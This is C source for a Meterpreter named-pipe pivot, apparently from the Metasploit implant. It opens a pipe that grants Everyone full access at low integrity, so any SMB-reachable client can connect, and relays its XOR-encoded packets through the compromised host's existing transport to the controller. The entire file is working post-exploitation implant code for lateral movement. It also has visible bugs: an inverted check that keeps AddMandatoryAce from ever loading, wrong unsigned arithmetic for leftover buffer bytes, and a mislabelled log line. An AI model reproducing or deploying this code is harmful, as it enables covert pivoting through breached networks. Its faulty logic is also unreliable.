#include "metsrv.h"
#include "../../common/common.h"
#include "server_pivot_named_pipe.h"

#include <AccCtrl.h>
#include <AclApi.h>

#define PIPE_NAME_SIZE 256
#define PIPE_BUFFER_SIZE 0x1000

typedef struct _NamedPipeContext
{
	// make sure we leave this as the first element, so that it can be cast
	// to an OVERLAPPED pointer for various operations.
	OVERLAPPED read_overlap;
	OVERLAPPED write_overlap;
	char       name[PIPE_NAME_SIZE];
	DWORD      open_mode;
	DWORD      pipe_mode;
	DWORD      pipe_count;
	Remote*    remote;
	HANDLE     pipe;
	BOOL       connecting;
	BOOL       established;
	BYTE       read_buffer[PIPE_BUFFER_SIZE];
	LPBYTE     packet_buffer;
	DWORD      packet_buffer_size;
	DWORD      packet_buffer_offset;
	DWORD      packet_required_size;
} NamedPipeContext;

static DWORD server_notify(Remote* remote, LPVOID entryContext, LPVOID threadContext);

typedef BOOL (WINAPI *PAddMandatoryAce)(PACL pAcl, DWORD dwAceRevision, DWORD dwAceFlags, DWORD dwMandatoryPolicy, PSID pLabelSid);
static BOOL WINAPI AddMandatoryAce(PACL pAcl, DWORD dwAceRevision, DWORD dwAceFlags, DWORD dwMandatoryPolicy, PSID pLabelSid)
{
	static BOOL attempted = FALSE;
	static PAddMandatoryAce pAddMandatoryAce = NULL;

	if (attempted)
	{
		attempted = TRUE;

		HMODULE lib = LoadLibraryA("advapi32.dll");
		if (lib != NULL)
		{
			pAddMandatoryAce = (PAddMandatoryAce)GetProcAddress(lib, "AddMandatoryAce");
			dprintf("[NP-SERVER] AddMandatoryAce: %p", pAddMandatoryAce);
		}
	}

	if (pAddMandatoryAce != NULL)
	{
		pAddMandatoryAce(pAcl, dwAceRevision, dwAceFlags, dwMandatoryPolicy, pLabelSid);
	}

	return TRUE;
}

static DWORD read_pipe_to_packet(NamedPipeContext* ctx, LPBYTE source, DWORD sourceSize)
{
	// Make sure we have the space to handle the incoming packet
	if (ctx->packet_buffer_size < sourceSize + ctx->packet_buffer_offset)
	{
		ctx->packet_buffer_size = sourceSize + ctx->packet_buffer_offset;
		ctx->packet_buffer = (LPBYTE)realloc(ctx->packet_buffer, ctx->packet_buffer_size);
	}

	// copy over the new data
	memcpy(ctx->packet_buffer + ctx->packet_buffer_offset, source, sourceSize);
	ctx->packet_buffer_offset += sourceSize;

	// check if the packet is complete
	if (ctx->packet_required_size == 0)
	{
		if (ctx->packet_buffer_offset >= sizeof(PacketHeader))
		{
			// get a copy of the header data and XOR it out so we can read the length
			PacketHeader header = *(PacketHeader*)ctx->packet_buffer;
			xor_bytes(header.xor_key, (LPBYTE)&header, sizeof(PacketHeader));
			ctx->packet_required_size = ntohl(header.length);
		}
	}

	if (ctx->packet_required_size > 0 && ctx->packet_required_size <= ctx->packet_buffer_offset)
	{
		// whole packet is ready for transmission to the other side! Pivot straight through the existing
		// transport by sending the raw packet to the transmitter.
		ctx->remote->transport->packet_transmit(ctx->remote, ctx->packet_buffer, ctx->packet_required_size);
		// TODO: error check?

		// with the packet sent, we need to rejig a bit here so that the next block of data
		// results in a new packet.
		DWORD diff = ctx->packet_required_size - ctx->packet_buffer_size;
		if (diff > 0)
		{
			memmove(ctx->packet_buffer, ctx->packet_buffer + ctx->packet_required_size, diff);
		};
		ctx->packet_buffer_offset = diff;
		ctx->packet_required_size = 0;
	}

	return ERROR_SUCCESS;
}

DWORD named_pipe_write_packet(LPVOID state, LPBYTE rawPacket, DWORD rawPacketLength)
{
	NamedPipeContext* ctx = (NamedPipeContext*)state;
	DWORD dwResult = ERROR_SUCCESS;
	DWORD bytesWritten = 0;

	dprintf("[NP-SERVER] Writing a total of %u", rawPacketLength);
	while (bytesWritten < rawPacketLength)
	{
		DWORD byteCount = 0;
		WriteFile(ctx->pipe, rawPacket, rawPacketLength - bytesWritten, NULL, &ctx->write_overlap);

		// blocking here is just fine, it's the reads we care about
		if (GetOverlappedResult(ctx->pipe, &ctx->write_overlap, &byteCount, TRUE))
		{
			dprintf("[NP-SERVER] Wrote %u", byteCount);
			bytesWritten += byteCount;
		}
		else
		{
			BREAK_ON_ERROR("[NP-SERVER] failed to do the write");
		}
		dprintf("[NP-SERVER] left to go: %u", rawPacketLength - bytesWritten);
	}

	dprintf("[NP SERVER] server write. finished. dwResult=%d, written=%d", dwResult, bytesWritten);

	return dwResult;
}

VOID create_pipe_security_attributes(PSECURITY_ATTRIBUTES psa)
{
	// Start with the DACL (perhaps try the NULL sid if it doesn't work?)
	SID_IDENTIFIER_AUTHORITY sidWorld = SECURITY_WORLD_SID_AUTHORITY;
	PSID sidEveryone = NULL;
	if (!AllocateAndInitializeSid(&sidWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &sidEveryone))
	{
		dprintf("[NP-SERVER] AllocateAndInitializeSid failed: %u", GetLastError());
		return;
	}

	dprintf("[NP-SERVER] sidEveryone: %p", sidEveryone);

	EXPLICIT_ACCESSW ea = { 0 };
	ea.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
	ea.grfAccessMode = SET_ACCESS;
	ea.grfInheritance = NO_INHERITANCE;
	ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea.Trustee.ptstrName = (LPWSTR)sidEveryone;

	//PACL dacl = (PACL)LocalAlloc(LPTR, 256);
	PACL dacl = NULL;
	DWORD result = SetEntriesInAclW(1, &ea, NULL, &dacl);
	if (result != ERROR_SUCCESS)
	{
		dprintf("[NP-SERVER] SetEntriesInAclW failed: %u", result);
	}
	dprintf("[NP-SERVER] DACL: %p", dacl);

	// set up the sacl
	SID_IDENTIFIER_AUTHORITY sidLabel = SECURITY_MANDATORY_LABEL_AUTHORITY;
	PSID sidLow = NULL;
	if (!AllocateAndInitializeSid(&sidLabel, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0, &sidLow))
	{
		dprintf("[NP-SERVER] AllocateAndInitializeSid failed: %u", GetLastError());
	}
	dprintf("[NP-SERVER] sidLow: %p", dacl);

	PACL sacl = (PACL)LocalAlloc(LPTR, 256);
	if (!InitializeAcl(sacl, 256, ACL_REVISION_DS))
	{
		dprintf("[NP-SERVER] InitializeAcl failed: %u", GetLastError());
	}

	if (!AddMandatoryAce(sacl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, sidLow))
	{
		dprintf("[NP-SERVER] AddMandatoryAce failed: %u", GetLastError());
	}

	// now build the descriptor
	PSECURITY_DESCRIPTOR sd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	if (!InitializeSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION))
	{
		dprintf("[NP-SERVER] InitializeSecurityDescriptor failed: %u", GetLastError());
	}

	// add the dacl
	if (!SetSecurityDescriptorDacl(sd, TRUE, dacl, FALSE))
	{
		dprintf("[NP-SERVER] SetSecurityDescriptorDacl failed: %u", GetLastError());
	}

	// now the sacl
	if (!SetSecurityDescriptorSacl(sd, TRUE, sacl, FALSE))
	{
		dprintf("[NP-SERVER] SetSecurityDescriptorSacl failed: %u", GetLastError());
	}

	psa->nLength = sizeof(SECURITY_ATTRIBUTES);
	psa->bInheritHandle = FALSE;
	psa->lpSecurityDescriptor = sd;
}

DWORD create_pipe_server_instance(NamedPipeContext* ctx)
{
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		// we always need overlapped mode
		ctx->open_mode |= FILE_FLAG_OVERLAPPED;

		// never allow PIPE_NOWAIT
		ctx->pipe_mode &= ~PIPE_NOWAIT;

		// set a sane value for the count
		if (ctx->pipe_count == 0)
		{
			ctx->pipe_count = PIPE_UNLIMITED_INSTANCES;
		}

		dprintf("[NP-SERVER] Creating new server instance of %s", ctx->name);
		dprintf("[NP-SERVER]   - open mode: 0x%x", ctx->open_mode);
		dprintf("[NP-SERVER]   - pipe mode: 0x%x", ctx->pipe_mode);
		dprintf("[NP-SERVER]   - pipe cnt : %d", ctx->pipe_count ? ctx->pipe_count : PIPE_UNLIMITED_INSTANCES);

		// set up a session that let's anyone with SMB access connect
		SECURITY_ATTRIBUTES sa = { 0 };
		create_pipe_security_attributes(&sa);

		ctx->pipe = CreateNamedPipeA(ctx->name, ctx->open_mode, ctx->pipe_mode, ctx->pipe_count ? ctx->pipe_count : PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_SIZE, PIPE_BUFFER_SIZE, 0, &sa);

		if (ctx->pipe == INVALID_HANDLE_VALUE)
		{
			BREAK_ON_ERROR("[NP-SERVER] Failed to create named pipe.");
		}

		dprintf("[NP-SERVER] Creating the handler event");
		// This must be signalled, so that the connect event kicks off on the new thread.
		ctx->read_overlap.hEvent = CreateEvent(NULL, TRUE, TRUE, NULL);
		if (ctx->read_overlap.hEvent == NULL)
		{
			BREAK_ON_ERROR("[NP-SERVER] Failed to create connect event for read overlap.");
		}

		// this should not be signalled as it's just for handling named pipe writes.
		ctx->write_overlap.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (ctx->write_overlap.hEvent == NULL)
		{
			BREAK_ON_ERROR("[NP-SERVER] Failed to create connect event for read overlap.");
		}

		dprintf("[NP-SERVER] Inserting the named pipe schedule entry");
		scheduler_insert_waitable(ctx->read_overlap.hEvent, ctx, NULL, server_notify, NULL);
	} while (0);

	return dwResult;
}

/*!
 * @brief Deallocates and cleans up the attributes of a named pipe server context.
 * @param ctx Pointer to the context to free.
 */
static VOID free_server_context(NamedPipeContext* ctx)
{
	do
	{
		if (!ctx)
		{
			break;
		}

		dprintf("[NP-SERVER] free_server_context. ctx=0x%08X", ctx);

		dprintf("[NP-SERVER] freeing up pipe handle 0x%x", ctx->pipe);
		if (ctx->pipe != NULL && ctx->pipe != INVALID_HANDLE_VALUE)
		{
			CloseHandle(ctx->pipe);
			ctx->pipe = NULL;
		}

		if (ctx->read_overlap.hEvent != NULL)
		{
			dprintf("[NP-SERVER] free_server_context. signaling the thread to stop");
			scheduler_signal_waitable(ctx->read_overlap.hEvent, Stop);
			ctx->read_overlap.hEvent = NULL;
		}

		if (ctx->write_overlap.hEvent != NULL)
		{
			CloseHandle(ctx->write_overlap.hEvent);
			ctx->write_overlap.hEvent = NULL;
		}

		SAFE_FREE(ctx->packet_buffer);

		free(ctx);

	} while (0);
}

/*!
 * @brief Notify routine for a named pipe server channel to pick up its new client connections..
 * @param remote Pointer to the remote instance.
 * @param serverCtx Pointer to the named pipe server context.
 * @returns Indication of success or failure.
 * @retval ERROR_SUCCESS Notification completed successfully.
 */
static DWORD server_notify(Remote* remote, LPVOID entryContext, LPVOID threadContext)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet* request = NULL;
	NamedPipeContext* serverCtx = (NamedPipeContext*)entryContext;
	BOOL performRead = FALSE;

	do
	{
		if (!serverCtx)
		{
			BREAK_WITH_ERROR("[NP-SERVER] server_notify. serverCtx == NULL", ERROR_INVALID_HANDLE);
		}

		if (serverCtx->pipe == NULL || serverCtx->pipe == INVALID_HANDLE_VALUE)
		{
			BREAK_WITH_ERROR("[NP-SERVER] pipe isn't present, we might be shutting down.", ERROR_INVALID_HANDLE);
		}

		if (!serverCtx->connecting)
		{
			serverCtx->connecting = TRUE;
			dprintf("[NP-SERVER] Connecting to the named pipe async");
			ConnectNamedPipe(serverCtx->pipe, &serverCtx->read_overlap);

			dwResult = GetLastError();
			dprintf("[NP-SERVER] checking the result of connect %u 0x%x", dwResult, dwResult);
			if (dwResult == ERROR_IO_PENDING)
			{
				dprintf("[NP-SERVER] still waiting for an overlapped connection");
				break;
			}
			else if (dwResult == ERROR_PIPE_LISTENING)
			{
				dprintf("[NP-SERVER] client has connected apparently");
				serverCtx->established = TRUE;
				// no break here, we want to continue
			}
			else
			{
				BREAK_WITH_ERROR("[NP-SERVER] Failed to connect to the named pipe", dwResult);
			}
			dwResult = ERROR_SUCCESS;
		}

		DWORD bytesProcessed = 0;
		dprintf("[NP-SERVER] Checking the overlapped result");
		if (!GetOverlappedResult(serverCtx->pipe, &serverCtx->read_overlap, &bytesProcessed, FALSE))
		{
			dwResult = GetLastError();
			dprintf("[NP-SERVER] server_notify. unable to get the result, %u", dwResult);

			if (dwResult == ERROR_IO_INCOMPLETE)
			{
				dprintf("[NP-SERVER] still waiting for something to happen on the pipe");
			}
			else if (dwResult == ERROR_BROKEN_PIPE)
			{
				dprintf("[NP-SERVER] the client appears to have bailed out, disconnecting...");
				ResetEvent(serverCtx->read_overlap.hEvent);
				return ERROR_BROKEN_PIPE;
			}
			break;
		}

		// spin up a new named pipe server instance to handle the next connection if this
		// connection is new.
		dprintf("[NP-SERVER] Apparently we have a result! With %u bytes", bytesProcessed);
		if (!serverCtx->established)
		{
			// this is a connect, so tell MSF about it.
			dprintf("[NP-SERVER] This appears to be a new connection, setting up context.");
			// TODO: when connected, we need to inform
			//request = packet_create(PACKET_TLV_TYPE_REQUEST, "named_pipe_channel_open");
			//if (!request)
			//{
			//	BREAK_WITH_ERROR("[NP-SERVER] request_net_tcp_server_channel_open. packet_create failed", ERROR_INVALID_HANDLE);
			//}

			// Connection received, here we're going to create a new named pipe handle so that
			// other connections can come in on it. We'll assume that it if worked once, it
			// will work again this time
			NamedPipeContext* nextCtx = (NamedPipeContext*)calloc(1, sizeof(NamedPipeContext));

			// copy the relevant content over.
			nextCtx->open_mode = serverCtx->open_mode;
			nextCtx->pipe_mode = serverCtx->pipe_mode;
			nextCtx->pipe_count = serverCtx->pipe_count;
			nextCtx->remote = serverCtx->remote;
			memcpy_s(&nextCtx->name, PIPE_NAME_SIZE, &serverCtx->name, PIPE_NAME_SIZE);

			// create a new pipe for the next connection
			DWORD result = create_pipe_server_instance(nextCtx);
			if (result != ERROR_SUCCESS)
			{
				dprintf("[NP-SERVER] failed to create the pipe server instance: %u", result);
				free_server_context(nextCtx);
			}

			//dwResult = packet_transmit(serverCtx->remote, request, NULL);

			serverCtx->established = TRUE;
		}

		if (bytesProcessed > 0)
		{
			dprintf("[NP-SERVER] read & sending bytes %u", bytesProcessed);
			read_pipe_to_packet(serverCtx, serverCtx->read_buffer, bytesProcessed);
		}

		performRead = TRUE;
	} while (0);

	if (serverCtx->read_overlap.hEvent != NULL)
	{
		dprintf("[NP-SERVER] Resetting the event handle");
		ResetEvent(serverCtx->read_overlap.hEvent);
	}

	// this has to be done after the signal is reset, otherwise ... STRANGE THINGS HAPPEN!
	if (performRead)
	{
		// prepare for reading
		serverCtx->read_overlap.Offset = 0;
		serverCtx->read_overlap.OffsetHigh = 0;

		// read the data from the pipe, we're async, so the return value of the function is meaningless.
		dprintf("[NP-SERVER] kicking off another read operation...");
		ReadFile(serverCtx->pipe, serverCtx->read_buffer, PIPE_BUFFER_SIZE, NULL, &serverCtx->read_overlap);
	}

	return dwResult;
}

/*!
 * @brief Allocates a streaming named pipe server channel.
 * @param remote Pointer to the remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 * @retval ERROR_SUCCESS Opening the server channel completed successfully.
 */
DWORD request_core_pivot_add_named_pipe(Remote* remote, Packet* packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	NamedPipeContext* ctx = NULL;
	Packet* response = NULL;
	char* namedPipeName = NULL;
	char* namedPipeServer = NULL;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			BREAK_WITH_ERROR("[NP-SERVER] request_net_named_pipe_server_channel_open. response == NULL", ERROR_NOT_ENOUGH_MEMORY);
		}

		ctx = (NamedPipeContext *)calloc(1, sizeof(NamedPipeContext));
		if (!ctx)
		{
			BREAK_WITH_ERROR("[NP-SERVER] request_net_named_pipe_server_channel_open. ctx == NULL", ERROR_NOT_ENOUGH_MEMORY);
		}

		ctx->remote = remote;

		//namedPipeName = packet_get_tlv_value_string(packet, TLV_TYPE_NAMED_PIPE_NAME);
		namedPipeName = "msf-pipe";
		if (!namedPipeName)
		{
			BREAK_WITH_ERROR("[NP-SERVER] request_net_named_pipe_server_channel_open. namedPipeName == NULL", ERROR_INVALID_PARAMETER);
		}

		if (strchr(namedPipeName, '\\') != NULL)
		{
			BREAK_WITH_ERROR("[NP-SERVER] request_net_named_pipe_server_channel_open. namedPipeName contains backslash (invalid)", ERROR_INVALID_PARAMETER);
		}

		//namedPipeServer = packet_get_tlv_value_string(packet, TLV_TYPE_NAMED_PIPE_SERVER);
		if (namedPipeServer == NULL)
		{
			namedPipeServer = ".";
		}

		// Both of these can be zero, let's hope that the user doesn't forget to set them if required!
		ctx->open_mode = PIPE_ACCESS_DUPLEX;
		ctx->pipe_mode = 0;

		_snprintf_s(ctx->name, PIPE_NAME_SIZE, PIPE_NAME_SIZE - 1, "\\\\%s\\pipe\\%s", namedPipeServer, namedPipeName);

		dwResult = create_pipe_server_instance(ctx);

		dprintf("[NP-SERVER] creation of the named pipe returned: %d 0x%x", dwResult, dwResult);

		if (dwResult == ERROR_SUCCESS)
		{
			dprintf("[NP-SERVER] request_net_named_pipe_server_channel_open. named pipe server %s", namedPipeName);
		}

	} while (0);

	packet_transmit_response(dwResult, remote, response);

	do
	{
		if (dwResult == ERROR_SUCCESS)
		{
			break;
		}

		dprintf("[NP-SERVER] Error encountered %u 0x%x", dwResult, dwResult);

		if (!ctx)
		{
			break;
		}

		if (ctx->read_overlap.hEvent != NULL)
		{
			dprintf("[NP-SERVER] Destroying wait handle");
			CloseHandle(ctx->read_overlap.hEvent);
		}

		if (ctx->pipe != NULL && ctx->pipe != INVALID_HANDLE_VALUE)
		{
			dprintf("[NP-SERVER] Destroying pipe");
			CloseHandle(ctx->pipe);
		}

		free(ctx);

	} while (0);

	return dwResult;
}